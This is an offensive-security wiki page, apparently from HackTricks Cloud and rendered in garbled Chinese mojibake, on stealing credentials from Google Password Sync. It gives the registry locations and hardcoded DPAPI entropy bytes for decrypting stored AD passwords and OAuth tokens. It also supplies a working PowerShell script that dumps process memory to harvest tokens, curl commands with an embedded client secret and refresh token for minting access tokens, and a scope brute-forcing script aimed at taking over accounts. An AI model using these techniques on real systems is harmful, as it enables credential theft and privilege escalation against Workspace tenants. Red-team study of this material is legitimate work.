# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

è¿™æ˜¯ Google æä¾›çš„äºŒè¿›åˆ¶æ–‡ä»¶å’ŒæœåŠ¡ï¼Œç”¨äº**ä¿æŒç”¨æˆ·åœ¨ AD å’Œ Workspace ä¹‹é—´çš„å¯†ç åŒæ­¥**ã€‚æ¯å½“ç”¨æˆ·åœ¨ AD ä¸­æ›´æ”¹å¯†ç æ—¶ï¼Œå®ƒä¼šè¢«è®¾ç½®åˆ° Googleã€‚

å®ƒå®‰è£…åœ¨ `C:\Program Files\Google\Password Sync`ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤æ‰¾åˆ°ç”¨äºé…ç½®çš„äºŒè¿›åˆ¶æ–‡ä»¶ `PasswordSync.exe` å’Œå°†ç»§ç»­è¿è¡Œçš„ `password_sync_service.exe`ï¼ˆæœåŠ¡ï¼‰ã€‚

### GPS - é…ç½®

è¦é…ç½®æ­¤äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå’ŒæœåŠ¡ï¼‰ï¼Œéœ€è¦**æˆäºˆå…¶å¯¹ Workspace ä¸­è¶…çº§ç®¡ç†å‘˜ä¸»ä½“çš„è®¿é—®æƒé™**ï¼š

* é€šè¿‡ **OAuth** ç™»å½• Googleï¼Œç„¶åå®ƒä¼š**åœ¨æ³¨å†Œè¡¨ä¸­å­˜å‚¨ä¸€ä¸ªä»¤ç‰Œï¼ˆåŠ å¯†ï¼‰**
* ä»…åœ¨å…·æœ‰ GUI çš„åŸŸæ§åˆ¶å™¨ä¸­å¯ç”¨
* æä¾›ä¸€äº›å…·æœ‰**ç®¡ç† Workspace ç”¨æˆ·**æƒé™çš„ GCP **æœåŠ¡å¸æˆ·å‡­æ®**ï¼ˆjson æ–‡ä»¶ï¼‰
* éå¸¸ç³Ÿç³•çš„ä¸»æ„ï¼Œå› ä¸ºè¿™äº›å‡­æ®æ°¸è¿œä¸ä¼šè¿‡æœŸï¼Œå¯èƒ½ä¼šè¢«æ»¥ç”¨
* éå¸¸ç³Ÿç³•çš„ä¸»æ„æ˜¯ç»™äºˆ SA å¯¹ Workspace çš„è®¿é—®æƒé™ï¼Œå› ä¸º SA å¯èƒ½åœ¨ GCP ä¸­è¢«æ”»ç ´ï¼Œå¹¶ä¸”å¯èƒ½ä¼šè½¬å‘ Workspace
* Google è¦æ±‚åœ¨æ²¡æœ‰ GUI çš„åŸŸæ§åˆ¶ä¸­ä½¿ç”¨å®ƒ
* è¿™äº›å‡­æ®ä¹Ÿå­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­

å…³äº ADï¼Œå¯ä»¥æŒ‡ç¤ºå®ƒä½¿ç”¨å½“å‰çš„**åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ã€åŒ¿åæˆ–æŸäº›ç‰¹å®šå‡­æ®**ã€‚å¦‚æœé€‰æ‹©å‡­æ®é€‰é¡¹ï¼Œ**ç”¨æˆ·å**å°†å­˜å‚¨åœ¨**ç£ç›˜**ä¸­çš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œ**å¯†ç **æ˜¯**åŠ å¯†**å¹¶å­˜å‚¨åœ¨**æ³¨å†Œè¡¨**ä¸­ã€‚

### GPS - ä»ç£ç›˜è½¬å‚¨å¯†ç å’Œä»¤ç‰Œ

{% hint style="success" %}
è¯·æ³¨æ„ï¼Œ[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) èƒ½å¤Ÿæ£€æµ‹åˆ° **GPS**ï¼Œè·å–æœ‰å…³é…ç½®çš„ä¿¡æ¯ï¼Œç”šè‡³**è§£å¯†å¯†ç å’Œä»¤ç‰Œ**ã€‚
{% endhint %}

åœ¨æ–‡ä»¶ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°éƒ¨åˆ†é…ç½®ï¼Œä¾‹å¦‚é…ç½®çš„ AD çš„ **`baseDN`** å’Œæ­£åœ¨ä½¿ç”¨çš„ **`username`**ã€‚

åœ¨æ³¨å†Œè¡¨ **`HKLM\Software\Google\Google Apps Password Sync`** ä¸­ï¼Œå¯ä»¥æ‰¾åˆ° AD ç”¨æˆ·çš„ **åŠ å¯†åˆ·æ–°ä»¤ç‰Œ** å’Œ **åŠ å¯†å¯†ç **ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚æ­¤å¤–ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æŸäº› **SA å‡­æ®**ï¼Œä¹Ÿå¯ä»¥åœ¨è¯¥æ³¨å†Œè¡¨åœ°å€ä¸­æ‰¾åˆ°è¿™äº›åŠ å¯†çš„å‡­æ®ã€‚æ­¤æ³¨å†Œè¡¨ä¸­çš„ **å€¼** ä»…å¯¹ **ç®¡ç†å‘˜** å¯è®¿é—®ã€‚

åŠ å¯†çš„ **å¯†ç **ï¼ˆå¦‚æœæœ‰ï¼‰ä½äºé”® **`ADPassword`** ä¸­ï¼Œå¹¶ä½¿ç”¨ **`CryptProtectData`** API è¿›è¡ŒåŠ å¯†ã€‚è¦è§£å¯†å®ƒï¼Œæ‚¨éœ€è¦ä¸é…ç½®å¯†ç åŒæ­¥çš„ç”¨æˆ·ç›¸åŒï¼Œå¹¶åœ¨ä½¿ç”¨ **`CryptUnprotectData`** æ—¶ä½¿ç”¨æ­¤ **ç†µ**ï¼š`byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

åŠ å¯†çš„ä»¤ç‰Œï¼ˆå¦‚æœæœ‰ï¼‰ä½äºé”® **`AuthToken`** ä¸­ï¼Œå¹¶ä½¿ç”¨ **`CryptProtectData`** API è¿›è¡ŒåŠ å¯†ã€‚è¦è§£å¯†å®ƒï¼Œæ‚¨éœ€è¦ä¸é…ç½®å¯†ç åŒæ­¥çš„ç”¨æˆ·ç›¸åŒï¼Œå¹¶åœ¨ä½¿ç”¨ **`CryptUnprotectData`** æ—¶ä½¿ç”¨æ­¤ **ç†µ**ï¼š`byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
æ­¤å¤–ï¼Œå®ƒè¿˜ä½¿ç”¨å­—å…¸ **`0123456789abcdefghijklmnopqrstv`** è¿›è¡Œ base32hex ç¼–ç ã€‚

ç†µå€¼æ˜¯é€šè¿‡ä½¿ç”¨è¯¥å·¥å…·æ‰¾åˆ°çš„ã€‚å®ƒè¢«é…ç½®ä¸ºç›‘è§†å¯¹ **`CryptUnprotectData`** å’Œ **`CryptProtectData`** çš„è°ƒç”¨ï¼Œç„¶åè¯¥å·¥å…·è¢«ç”¨æ¥å¯åŠ¨å’Œç›‘è§† `PasswordSync.exe`ï¼Œè¯¥å·¥å…·å°†åœ¨å¼€å§‹æ—¶è§£å¯†é…ç½®çš„å¯†ç å’Œèº«ä»½éªŒè¯ä»¤ç‰Œï¼Œå¹¶å°†**æ˜¾ç¤ºç”¨äº**ä¸¤ç§æƒ…å†µçš„ç†µå€¼ï¼š

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

è¯·æ³¨æ„ï¼Œä¹Ÿå¯ä»¥åœ¨å¯¹è¿™äº› API çš„è°ƒç”¨çš„è¾“å…¥æˆ–è¾“å‡ºä¸­æŸ¥çœ‹**è§£å¯†**å€¼ï¼ˆä»¥é˜² Winpeas åœ¨æŸä¸ªæ—¶å€™åœæ­¢å·¥ä½œï¼‰ã€‚

å¦‚æœå¯†ç åŒæ­¥æ˜¯**ä½¿ç”¨ SA å‡­æ®é…ç½®çš„**ï¼Œå®ƒä¹Ÿå°†å­˜å‚¨åœ¨æ³¨å†Œè¡¨ **`HKLM\Software\Google\Google Apps Password Sync`** ä¸­çš„é”®å†…ã€‚

### GPS - ä»å†…å­˜è½¬å‚¨ä»¤ç‰Œ

ä¸ GCPW ä¸€æ ·ï¼Œå¯ä»¥è½¬å‚¨ `PasswordSync.exe` å’Œ `password_sync_service.exe` è¿›ç¨‹çš„å†…å­˜ï¼Œæ‚¨å°†èƒ½å¤Ÿæ‰¾åˆ°åˆ·æ–°å’Œè®¿é—®ä»¤ç‰Œï¼ˆå¦‚æœå®ƒä»¬å·²ç»ç”Ÿæˆï¼‰ã€‚\
æˆ‘æƒ³æ‚¨ä¹Ÿå¯ä»¥æ‰¾åˆ°é…ç½®çš„ AD å‡­æ®ã€‚

<details>

<summary>è½¬å‚¨ <code>PasswordSync.exe</code> å’Œ <code>password_sync_service.exe</code> è¿›ç¨‹å¹¶æœç´¢ä»¤ç‰Œ</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œç”Ÿæˆè®¿é—®ä»¤ç‰Œ

ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¥åŠä»¥ä¸‹å‘½ä»¤ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥ç”Ÿæˆè®¿é—®ä»¤ç‰Œï¼š
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå³ä½¿æ‹¥æœ‰åˆ·æ–°ä»¤ç‰Œï¼Œä¹Ÿæ— æ³•è¯·æ±‚è®¿é—®ä»¤ç‰Œçš„ä»»ä½•èŒƒå›´ï¼Œå› ä¸ºæ‚¨åªèƒ½è¯·æ±‚**ç”±æ‚¨ç”Ÿæˆè®¿é—®ä»¤ç‰Œçš„åº”ç”¨ç¨‹åºæ”¯æŒçš„èŒƒå›´**ã€‚

æ­¤å¤–ï¼Œåˆ·æ–°ä»¤ç‰Œå¹¶ä¸åœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºä¸­æœ‰æ•ˆã€‚
{% endhint %}

é»˜è®¤æƒ…å†µä¸‹ï¼ŒGPS ä½œä¸ºç”¨æˆ·ä¸ä¼šå¯¹æ¯ä¸ªå¯èƒ½çš„ OAuth èŒƒå›´å…·æœ‰è®¿é—®æƒé™ï¼Œå› æ­¤ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¯ä»¥ä¸ `refresh_token` ä¸€èµ·ä½¿ç”¨ä»¥ç”Ÿæˆ `access_token` çš„èŒƒå›´ï¼š

<details>

<summary>Bash è„šæœ¬ä»¥æš´åŠ›ç ´è§£èŒƒå›´</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

è¿™æ˜¯æˆ‘åœ¨å†™ä½œæ—¶å¾—åˆ°çš„è¾“å‡ºï¼š
```
https://www.googleapis.com/auth/admin.directory.user
```
å“ªä¸€ä¸ªæ˜¯å¦‚æœä½ ä¸æŒ‡æ˜ä»»ä½•èŒƒå›´æ—¶å¾—åˆ°çš„ã€‚

{% hint style="danger" %}
åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œä½ å¯ä»¥**ä¿®æ”¹ç°æœ‰ç”¨æˆ·çš„å¯†ç ä»¥æå‡æƒé™**ã€‚
{% endhint %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
